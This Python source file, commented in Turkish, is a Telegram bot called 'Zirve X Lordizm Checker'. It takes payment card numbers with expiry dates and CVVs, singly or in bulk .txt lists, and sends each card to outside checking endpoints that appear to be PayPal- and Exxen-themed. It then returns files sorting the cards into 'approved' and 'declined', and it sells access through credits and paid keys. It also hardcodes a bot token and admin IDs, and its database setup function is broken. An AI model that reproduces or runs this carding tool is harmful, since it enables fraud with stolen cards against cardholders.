import logging
# import sqlite3 # KALDIRILDI - aiosqlite kullanılıyor
import aiosqlite # ASIL CANAVAR BU
import aiofiles # BU DA ONUN YAVRUSU
import datetime
import asyncio
import os # BU PİÇİ EKLEDİK
from urllib.parse import quote

import httpx
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    ConversationHandler,
    filters,
)
from telegram.constants import ParseMode

# --- BOT AYARLARI ---
TOKEN = "8030336781:AAGcnUStBbfT_yGASaPuughMofbNdmM5dGU"
ADMIN_IDS = [7272527047, 7995980007]
ADMIN_USERNAMES = ["@Heroxcredit", "@ruhsuzjoker"]

# --- KANAL VE API AYARLARI ---
REQUIRED_CHANNELS = [
    {"name": "Zirve Finans", "username": "@Zirvefinans_sh4"},
    {"name": "Zirve Chat", "username": "@HEROXCC_chat"},
    {"name": "Lordizm SH4", "username": "@lordizmsh4"},
    {"name": "Lordizm Chat", "username": "@lordizmchat"},
]
PAYPAL_API_URL = "http://lordapis.xyz/paypal.php?kart={card}"
EXXEN_API_URL = "http://lordapis.xyz/exxen.php?kart={card}"

# --- Veritabanı Ayarları ---
DB_NAME = "bot_data.db"

# --- SENKRON VERİTABANI KURULUMU (SADECE İLK ÇALIŞTIRMADA) ---
def initial_setup_database():
    conn = await aiosqlite.connect(DB_NAME)
    cursor = await conn.cursor()
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, username TEXT, credits INTEGER DEFAULT 100,
        last_credit_reset DATE, key_id TEXT, key_expires TIMESTAMP
    )""")
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS keys (
        key_value TEXT PRIMARY KEY, duration_hours INTEGER, is_used INTEGER DEFAULT 0,
        used_by INTEGER, used_at TIMESTAMP
    )""")
    cursor.execute("CREATE TABLE IF NOT EXISTS banned_users (user_id INTEGER PRIMARY KEY, reason TEXT)")
    cursor.execute("CREATE TABLE IF NOT EXISTS maintenance (api_name TEXT PRIMARY KEY, is_active INTEGER DEFAULT 1)")
    try:
        cursor.execute("INSERT INTO maintenance (api_name) VALUES (?)", ('Paypal',))
        cursor.execute("INSERT INTO maintenance (api_name) VALUES (?)", ('Exxen',))
    except aiosqlite.IntegrityError:
        pass # Zaten varsa siktir et
    conn.commit()
    conn.close()

# --- ASENKRON YARDIMCI FONKSİYONLAR ---
async def is_admin(user_id: int) -> bool: return user_id in ADMIN_IDS

async def check_membership(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    for channel in REQUIRED_CHANNELS:
        try:
            member = await context.bot.get_chat_member(chat_id=channel["username"], user_id=user_id)
            if member.status not in ['member', 'administrator', 'creator']: return False
        except Exception as e:
            logging.error(f"Üyelik kontrol hatası ({channel['username']}): {e}")
            return False
    return True

async def get_user(user_id: int):
    async with aiosqlite.connect(DB_NAME) as db:
        cursor = await db.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        user_data = await cursor.fetchone()
        return user_data

async def update_or_create_user(user_id: int, username: str):
    async with aiosqlite.connect(DB_NAME) as db:
        today = datetime.date.today().isoformat()
        await db.execute("INSERT INTO users (user_id, username, last_credit_reset) VALUES (?, ?, ?) ON CONFLICT(user_id) DO UPDATE SET username = excluded.username", (user_id, username, today))
        await db.commit()
    
async def check_and_reset_credits(user_id: int):
    async with aiosqlite.connect(DB_NAME) as db:
        today = datetime.date.today()
        cursor = await db.execute("SELECT last_credit_reset FROM users WHERE user_id = ?", (user_id,))
        result = await cursor.fetchone()
        if result and datetime.datetime.strptime(result[0], '%Y-%m-%d').date() < today:
            await db.execute("UPDATE users SET credits = 100, last_credit_reset = ? WHERE user_id = ? AND key_id IS NULL", (today.isoformat(), user_id))
            await db.commit()

async def is_banned(user_id: int) -> bool:
    async with aiosqlite.connect(DB_NAME) as db:
        cursor = await db.execute("SELECT 1 FROM banned_users WHERE user_id = ?", (user_id,))
        result = await cursor.fetchone()
        return result is not None

# --- Komutlar ---
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    help_text = "🤖 **Zirve X Lordizm Checker Yardım Menüsü**\n\n"
    help_text += "Aşağıda kullanabileceğiniz komutların listesi ve açıklamaları bulunmaktadır.\n\n"
    help_text += "👤 **Kullanıcı Komutları:**\n"
    help_text += "`/start` - Botu başlatır.\n"
    help_text += "`/check` - Kart check etme menüsünü açar.\n"
    help_text += "`/me` - Profil bilgilerinizi gösterir.\n"
    help_text += "`/key <anahtar>` - Bir kullanım anahtarını aktif eder.\n"
    help_text += "`/help` - Bu yardım menüsünü gösterir.\n\n"

    if await is_admin(user_id):
        help_text += "👑 **Admin Komutları:**\n"
        help_text += "`/uret <key> <süre>` - Yeni bir key üretir.\n"
        help_text += "`/ban <id> <sebep>` - Bir kullanıcıyı yasaklar.\n"
        help_text += "`/profil <id>` - Bir kullanıcının profilini görüntüler.\n"
        help_text += "`/bakim <api_ismi>` - API'yi bakıma alır.\n"
        help_text += "`/aktifet <api_ismi>` - API'yi aktif eder.\n"
    
    await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)

async def uret_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update.effective_user.id): return
    try:
        key, sure_str = context.args
        sure = int(sure_str)
        async with aiosqlite.connect(DB_NAME) as db:
            await db.execute("INSERT OR IGNORE INTO keys (key_value, duration_hours) VALUES (?, ?)", (key, sure))
            await db.commit()
        await update.message.reply_text(f"🔑 Key oluşturuldu: `{key}`, Süre: {sure} saat", parse_mode=ParseMode.MARKDOWN)
    except (ValueError, IndexError):
        await update.message.reply_text("❌ Kullanım: `/uret YENIKEY 24`")

async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update.effective_user.id): return
    try:
        user_id_to_ban = int(context.args[0])
        reason = " ".join(context.args[1:]) if len(context.args) > 1 else "Belirtilmedi"
        async with aiosqlite.connect(DB_NAME) as db:
            await db.execute("INSERT OR IGNORE INTO banned_users (user_id, reason) VALUES (?, ?)", (user_id_to_ban, reason))
            await db.commit()
        await update.message.reply_text(f"🚫 Kullanıcı `{user_id_to_ban}` yasaklandı. Sebep: {reason}", parse_mode=ParseMode.MARKDOWN)
        try:
            admin_contacts = " veya ".join(ADMIN_USERNAMES)
            await context.bot.send_message(chat_id=user_id_to_ban, text=f"🚫 Bottan yasaklandınız.\n*Sebep:* {reason}\nİtiraz için: {admin_contacts}", parse_mode=ParseMode.MARKDOWN)
        except Exception as e: await update.message.reply_text(f"Kullanıcıya bildirim gönderilemedi. Hata: {e}")
    except Exception: await update.message.reply_text("❌ Kullanım: `/ban 123456789 Spam`")

async def profil_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update.effective_user.id): return
    try:
        user_id_to_check = int(context.args[0])
        user_db = await get_user(user_id_to_check)
        if not user_db: await update.message.reply_text("Kullanıcı bulunamadı."); return
        user_id, username, credits, _, key_id, key_expires = user_db
        profil_mesaji = f"👤 **Kullanıcı Profili**\nID: `{user_id}`\nKullanıcı Adı: @{username}\n"
        if await is_admin(user_id): profil_mesaji += f"Kredi: Sınırsız ♾️ (Admin)\n"
        elif key_id:
            expires_dt = datetime.datetime.fromisoformat(key_expires)
            kalan_sure = expires_dt - datetime.datetime.now()
            profil_mesaji += f"Kredi: Sınırsız ♾️\nAktif Key: `{key_id}`\n"
            if kalan_sure.total_seconds() > 0:
                hours, rem = divmod(int(kalan_sure.total_seconds()), 3600); mins, _ = divmod(rem, 60)
                profil_mesaji += f"Kalan Süre: {hours}s {mins}d\n"
            else: profil_mesaji += "Süre: Dolmuş ❌\n"
        else: profil_mesaji += f"Kredi: {credits}\n"
        await update.message.reply_text(profil_mesaji, parse_mode=ParseMode.MARKDOWN)
    except Exception: await update.message.reply_text("❌ Kullanım: `/profil 123456789`")

async def bakim_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update.effective_user.id): return
    try:
        api_name = context.args[0].capitalize()
        if api_name not in ['Paypal', 'Exxen']: await update.message.reply_text("❌ API 'Paypal' veya 'Exxen' olmalı."); return
        async with aiosqlite.connect(DB_NAME) as db:
            await db.execute("UPDATE maintenance SET is_active = 0 WHERE api_name = ?", (api_name,)); await db.commit()
        await update.message.reply_text(f"🔧 `{api_name}` API'si bakıma alındı.", parse_mode=ParseMode.MARKDOWN)
    except IndexError: await update.message.reply_text("❌ Kullanım: `/bakim Paypal`")

async def aktifet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update.effective_user.id): return
    try:
        api_name = context.args[0].capitalize()
        if api_name not in ['Paypal', 'Exxen']: await update.message.reply_text("❌ API 'Paypal' veya 'Exxen' olmalı."); return
        async with aiosqlite.connect(DB_NAME) as db:
            await db.execute("UPDATE maintenance SET is_active = 1 WHERE api_name = ?", (api_name,)); await db.commit()
        await update.message.reply_text(f"✅ `{api_name}` API'si aktif edildi.", parse_mode=ParseMode.MARKDOWN)
    except IndexError: await update.message.reply_text("❌ Kullanım: `/aktifet Exxen`")

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if await is_banned(user.id): await update.message.reply_text("🚫 Yasaklandınız."); return
    await update_or_create_user(user.id, user.username)
    if not await check_membership(user.id, context):
        keyboard = [[InlineKeyboardButton(f"🔗 {ch['name']}", url=f"https://t.me/{ch['username'].replace('@', '')}")] for ch in REQUIRED_CHANNELS]
        keyboard.append([InlineKeyboardButton("✅ Katıldım", callback_data="join_check")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "**Zirve X Lordizm Checker'a Hoş Geldiniz!** 🚀\n\n"
            "Lütfen aşağıdaki TÜM kanallara katılın ve 'Katıldım' butonuna basın.",
            reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN
        )
    else: await send_main_menu(update, context)

async def join_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; await query.answer()
    if await check_membership(query.from_user.id, context):
        await query.edit_message_text(text="✅ Teşekkürler! Artık botu kullanabilirsiniz.")
        await send_main_menu(update, context, query.message.chat_id)
    else: await query.answer("❗️ Lütfen belirtilen TÜM kanallara katıldığınızdan emin olun.", show_alert=True)

async def send_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, chat_id=None):
    if chat_id is None: chat_id = update.effective_chat.id
    keyboard = [[InlineKeyboardButton("💳 Check İşlemleri", callback_data="go_to_check")],
                [InlineKeyboardButton("👤 Profilim", callback_data="show_me")],
                [InlineKeyboardButton("🔑 Key Kullan", callback_data="use_key_prompt")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await context.bot.send_message(chat_id=chat_id, text="**Ana Menü**", reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)

async def me_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if await is_banned(user_id): return
    if await is_admin(user_id):
        await update.message.reply_text(f"👑 **Patron Profili**\nKullanıcı: @{update.effective_user.username}\nKredi: Sınırsız ♾️", parse_mode=ParseMode.MARKDOWN)
        return
    await check_and_reset_credits(user_id)
    user = await get_user(user_id)
    if not user: await update.message.reply_text("Sisteme kayıtlı değilsiniz. /start atın."); return
    _, username, credits, _, key_id, key_expires = user
    profil_mesaji = f"👤 **Profiliniz**\nKullanıcı Adı: @{username}\n"
    if key_id and key_expires:
        expires_dt = datetime.datetime.fromisoformat(key_expires)
        kalan_sure = expires_dt - datetime.datetime.now()
        if kalan_sure.total_seconds() > 0:
            hours, rem = divmod(int(kalan_sure.total_seconds()), 3600); mins, _ = divmod(rem, 60)
            profil_mesaji += f"Kredi: Sınırsız ♾️\nKalan Süre: {hours}s {mins}d ⏰\n"
        else:
            async with aiosqlite.connect(DB_NAME) as db:
                await db.execute("UPDATE users SET key_id=NULL,key_expires=NULL,credits=100 WHERE user_id=?",(user_id,))
                await db.commit()
            profil_mesaji += f"Kredi: 100 💳 (Key süreniz doldu)\n"
    else:
        profil_mesaji += f"Kredi: {credits} 💳\n_Krediler her gün yenilenir._"
    await update.message.reply_text(profil_mesaji, parse_mode=ParseMode.MARKDOWN)

async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if await is_banned(user_id): return
    try:
        user_key = context.args[0]
        async with aiosqlite.connect(DB_NAME) as db:
            cursor = await db.execute("SELECT duration_hours, is_used FROM keys WHERE key_value = ?", (user_key,))
            key_data = await cursor.fetchone()
            if not key_data: await update.message.reply_text("❌ Geçersiz key."); return
            duration, is_used = key_data
            if is_used: await update.message.reply_text("❌ Bu key daha önce kullanılmış."); return
            
            now=datetime.datetime.now(); expires_at=now+datetime.timedelta(hours=duration)
            await db.execute("UPDATE keys SET is_used=1,used_by=?,used_at=? WHERE key_value=?",(user_id,now,user_key))
            await db.execute("UPDATE users SET key_id=?,key_expires=?,credits=99999 WHERE user_id=?",(user_key,expires_at.isoformat(),user_id))
            await db.commit()
        await update.message.reply_text(f"✅ Key aktif edildi! **{duration} saat** sınırsız check hakkı.", parse_mode=ParseMode.MARKDOWN)
    except IndexError: await update.message.reply_text("❌ Kullanım: `/key ABC-123`")

# --- CHECKER CONVERSATION HANDLER ---
CHOOSE_API, CHOOSE_CHECK_TYPE, SINGLE_CHECK, MASS_CHECK = range(4)

async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.callback_query:
        await update.callback_query.answer()
        user_id = update.callback_query.from_user.id; chat_id = update.effective_chat.id
    else:
        user_id = update.message.from_user.id; chat_id = update.effective_chat.id
    
    if await is_banned(user_id): return ConversationHandler.END
    if not await check_membership(user_id, context):
        await context.bot.send_message(chat_id=chat_id, text="❗️ Check için TÜM kanallara katılmalısınız. /start atın.")
        return ConversationHandler.END
    
    await check_and_reset_credits(user_id)
    user_data = await get_user(user_id)
    if not user_data:
        await context.bot.send_message(chat_id=chat_id, text="Sistemde kaydın yok, önce /start at amk.")
        return ConversationHandler.END

    credits = user_data[2]; key_active = user_data[4] is not None
    
    if not await is_admin(user_id) and not key_active and credits <= 0:
        await context.bot.send_message(chat_id=chat_id, text="😔 Krediniz bitti."); return ConversationHandler.END

    async with aiosqlite.connect(DB_NAME) as db:
        cursor = await db.execute("SELECT api_name, is_active FROM maintenance")
        rows = await cursor.fetchall()
        maintenance_status = {r[0]:bool(r[1]) for r in rows}
    
    keyboard = []
    if maintenance_status.get('Paypal', True): keyboard.append([InlineKeyboardButton("💳 Paypal", callback_data="api_paypal")])
    else: keyboard.append([InlineKeyboardButton("🔧 Paypal (Bakımda)", callback_data="disabled")])
    if maintenance_status.get('Exxen', True): keyboard.append([InlineKeyboardButton("🎬 Exxen", callback_data="api_exxen")])
    else: keyboard.append([InlineKeyboardButton("🔧 Exxen (Bakımda)", callback_data="disabled")])
    keyboard.append([InlineKeyboardButton("❌ İptal", callback_data="cancel_check")])
    
    await context.bot.send_message(chat_id=chat_id, text="API seçin:", reply_markup=InlineKeyboardMarkup(keyboard))
    
    if update.callback_query: await update.callback_query.message.delete()
        
    return CHOOSE_API

async def main_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; await query.answer()
    user_id = query.from_user.id; username = query.from_user.username; chat_id = query.effective_chat.id

    if query.data == 'show_me':
        if await is_admin(user_id):
            profil_mesaji = f"👑 **Patron Profili**\nKullanıcı: @{username}\nKredi: Sınırsız ♾️"
            await context.bot.send_message(chat_id=chat_id, text=profil_mesaji, parse_mode=ParseMode.MARKDOWN); return

        await check_and_reset_credits(user_id); user = await get_user(user_id)
        if not user: await context.bot.send_message(chat_id=chat_id, text="Sisteme kayıtlı değilsiniz. /start atın."); return
        _, db_username, credits, _, key_id, key_expires = user
        profil_mesaji = f"👤 **Profiliniz**\nKullanıcı Adı: @{db_username}\n"
        if key_id and key_expires:
            expires_dt = datetime.datetime.fromisoformat(key_expires); kalan_sure = expires_dt - datetime.datetime.now()
            if kalan_sure.total_seconds() > 0:
                hours, rem = divmod(int(kalan_sure.total_seconds()), 3600); mins, _ = divmod(rem, 60)
                profil_mesaji += f"Kredi: Sınırsız ♾️\nKalan Süre: {hours}s {mins}d ⏰\n"
            else:
                async with aiosqlite.connect(DB_NAME) as db:
                    await db.execute("UPDATE users SET key_id=NULL,key_expires=NULL,credits=100 WHERE user_id=?",(user_id,)); await db.commit()
                profil_mesaji += f"Kredi: 100 💳 (Key süreniz doldu)\n"
        else: profil_mesaji += f"Kredi: {credits} 💳\n_Krediler her gün yenilenir._"
        await context.bot.send_message(chat_id=chat_id, text=profil_mesaji, parse_mode=ParseMode.MARKDOWN)

    elif query.data == 'use_key_prompt':
        await context.bot.send_message(chat_id=chat_id, text="`/key <anahtar>` komutunu kullanarak anahtarınızı girin.", parse_mode=ParseMode.MARKDOWN)

async def choose_api_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; await query.answer(); context.user_data['api'] = query.data.split('_')[1]
    keyboard = [[InlineKeyboardButton("☝️ Tekli Check", callback_data="type_single")],
                [InlineKeyboardButton("🗂️ Mass Check (TXT)", callback_data="type_mass")],
                [InlineKeyboardButton("⬅️ Geri", callback_data="go_back_api")]]
    await query.edit_message_text(f"**API: {context.user_data['api'].capitalize()}**\n\nCheck türünü seçin.", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
    return CHOOSE_CHECK_TYPE

async def choose_check_type_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query=update.callback_query; await query.answer(); check_type=query.data.split('_')[1]
    if check_type=='single':
        await query.edit_message_text("Kartı şu formatta gönder:\n`0123456789123456|03|28|123`", parse_mode=ParseMode.MARKDOWN); return SINGLE_CHECK
    elif check_type=='mass':
        await query.edit_message_text("`.txt` dosyası gönder.", parse_mode=ParseMode.MARKDOWN); return MASS_CHECK
    return ConversationHandler.END

async def check_card_api(card: str, api_type: str) -> str:
    try:
        timeout_duration = 60
        url = (PAYPAL_API_URL if api_type == 'paypal' else EXXEN_API_URL).format(card=quote(card))
        async with httpx.AsyncClient(timeout=timeout_duration) as client:
            response = await client.get(url)
            response.raise_for_status()
            return response.text
    except httpx.TimeoutException: return f"API Hatası: Sunucu {timeout_duration} saniye içinde cevap vermedi (Timed out)."
    except httpx.RequestError as e: return f"API Hatası: {e}"
    except Exception as e: return f"Bilinmeyen Hata: {e}"

async def single_check_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    card_info=update.message.text; user_id=update.effective_user.id; api_type=context.user_data.get('api')
    is_user_admin = await is_admin(user_id)
    user_data = None
    if not is_user_admin:
        user_data = await get_user(user_id)
        if not user_data:
             await update.message.reply_text("Sistemde kaydın yok, önce /start at amk.")
             return ConversationHandler.END
        credits = user_data[2]; key_active = user_data[4] is not None
        if not key_active and credits <= 0: await update.message.reply_text("😔 Krediniz bitti."); return ConversationHandler.END
    parts = card_info.split('|')
    if len(parts) != 4 or not all(p.isdigit() for p in (parts[0], parts[1], parts[2], parts[3])):
        await update.message.reply_text("❌ Geçersiz format."); return SINGLE_CHECK
    msg = await update.message.reply_text("⏳ Kontrol ediliyor...")
    api_response = await check_card_api(card_info, api_type)
    await msg.edit_text(f"**Sonuç:**\n\n`{card_info}`\n`{api_response}`", parse_mode=ParseMode.MARKDOWN)
    if not is_user_admin and not (user_data and user_data[4] is not None):
        async with aiosqlite.connect(DB_NAME) as db:
            await db.execute("UPDATE users SET credits=credits-1 WHERE user_id=?", (user_id,))
            await db.commit()
    return ConversationHandler.END
    
async def mass_check_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    api_type = context.user_data.get('api')
    is_user_admin = await is_admin(user_id)
    key_active = False

    if not is_user_admin:
        user_data = await get_user(user_id)
        if not user_data:
            await update.message.reply_text("Sistemde kaydın yok, önce /start at amk.")
            return ConversationHandler.END
        credits = user_data[2]
        key_active = user_data[4] is not None

    if not update.message.document or not update.message.document.file_name.endswith('.txt'):
        await update.message.reply_text("Lütfen `.txt` dosyası gönderin.")
        return MASS_CHECK

    txt_file = await update.message.document.get_file()
    file_content = await txt_file.download_as_bytearray()
    cards = [line.strip() for line in file_content.decode('utf-8', errors='ignore').strip().split('\n') if line.strip()]

    if not cards:
        await update.message.reply_text("❌ Dosya boş.")
        return ConversationHandler.END
    
    total_cards = len(cards)

    if not is_user_admin and not key_active:
        user_data = await get_user(user_id)
        credits = user_data[2]
        if total_cards > credits:
            await update.message.reply_text(f"😔 Yetersiz kredi. Gerekli: {total_cards}, Mevcut: {credits}.")
            return ConversationHandler.END

    status_msg = await update.message.reply_text(f"✅ Dosya alındı. {total_cards} kart kontrol ediliyor...")
    approved, declined = [], []

    tasks = [check_card_api(card, api_type) for card in cards]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    for i, (card, api_response) in enumerate(zip(cards, results)):
        parts = card.split('|')
        if len(parts) != 4 or not all(p.isdigit() for p in (parts[0], parts[1], parts[2], parts[3])):
            declined.append(f"{card}|Geçersiz Format")
            continue

        if isinstance(api_response, Exception):
            declined.append(f"{card} | Hata: {api_response}")
        elif "APPROVED" in str(api_response).upper() or "CVV MATCHED" in str(api_response).upper() or "SUCCESS" in str(api_response).upper():
            approved.append(f"{card} | {api_response}")
        else:
            declined.append(f"{card} | {api_response}")
        
        progress = i + 1
        update_interval = total_cards // 20 or 1 
        if progress % update_interval == 0 or progress == total_cards:
            try:
                percentage = (progress / total_cards) * 100
                bar = '█' * int(10 * progress // total_cards) + '─' * (10 - int(10 * progress // total_cards))
                await status_msg.edit_text(
                    f"⏳ `{progress}/{total_cards}`\n[{bar}] {percentage:.1f}%\n\n✅: {len(approved)} | ❌: {len(declined)}",
                    parse_mode=ParseMode.MARKDOWN
                )
                # await asyncio.sleep(0.2)  # Kaldırıldı: sıra bekleme engellendi
            except Exception:
                pass

    if not is_user_admin and not key_active:
        async with aiosqlite.connect(DB_NAME) as db:
            await db.execute("UPDATE users SET credits=credits-? WHERE user_id=?", (total_cards, user_id))
            await db.commit()

    await status_msg.delete()
    await update.message.reply_text(f"🏁 **Check Tamamlandı!**\nToplam: {total_cards}\n✅ Approved: {len(approved)}\n❌ Declined: {len(declined)}")
    
    try:
        if approved:
            approved_filename = f"APPROVED_{user_id}.txt"
            async with aiofiles.open(approved_filename, "w", encoding="utf-8") as f:
                await f.write("\n".join(approved))
            await update.message.reply_document(document=approved_filename, caption="✅ Approved Kartlar")
            os.remove(approved_filename)

        if declined:
            declined_filename = f"DECLINED_{user_id}.txt"
            async with aiofiles.open(declined_filename, "w", encoding="utf-8") as f:
                await f.write("\n".join(declined))
            await update.message.reply_document(document=declined_filename, caption="❌ Declined Kartlar")
            os.remove(declined_filename)
            
    except Exception as e:
        await update.message.reply_text(f"Dosyaları gönderirken bir hata oldu amk: {e}")

    return ConversationHandler.END

async def cancel_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; await query.answer(); await query.edit_message_text("İşlem iptal edildi.")
    return ConversationHandler.END

async def go_back_to_api_select(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await check_command(update, context); return CHOOSE_API

async def disabled_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer("Bu API şu anda bakımda.", show_alert=True)

def main() -> None:
    initial_setup_database()
    
    application = Application.builder().token(TOKEN).build()
    
    handlers = [
        CommandHandler("start", start_command),
        CommandHandler("help", help_command),
        CommandHandler("uret", uret_command),
        CommandHandler("ban", ban_command),
        CommandHandler("profil", profil_command),
        CommandHandler("bakim", bakim_command),
        CommandHandler("aktifet", aktifet_command),
        CommandHandler("key", key_command),
        CommandHandler("me", me_command),
        CallbackQueryHandler(join_check_callback, pattern='^join_check$'),
        CallbackQueryHandler(disabled_callback, pattern='^disabled$'),
        CallbackQueryHandler(main_menu_callback, pattern='^(show_me|use_key_prompt)$')
    ]
    application.add_handlers(handlers)
    
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("check", check_command), CallbackQueryHandler(check_command, pattern='^go_to_check$')],
        states={
            CHOOSE_API: [CallbackQueryHandler(choose_api_callback, pattern='^api_')],
            CHOOSE_CHECK_TYPE: [
                CallbackQueryHandler(choose_check_type_callback, pattern='^type_'),
                CallbackQueryHandler(go_back_to_api_select, pattern='^go_back_api$')
            ],
            SINGLE_CHECK: [MessageHandler(filters.TEXT & ~filters.COMMAND, single_check_handler)],
            MASS_CHECK: [MessageHandler(filters.Document.TXT, mass_check_handler)],
        },
        fallbacks=[CallbackQueryHandler(cancel_check, pattern='^cancel_check$'), CommandHandler("start", start_command)],
        per_message=False
    )
    application.add_handler(conv_handler)
    
    print("Zirve X Lordizm Checker çalışıyor amk...")
    application.run_polling()

if __name__ == "__main__":
    logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
    main()
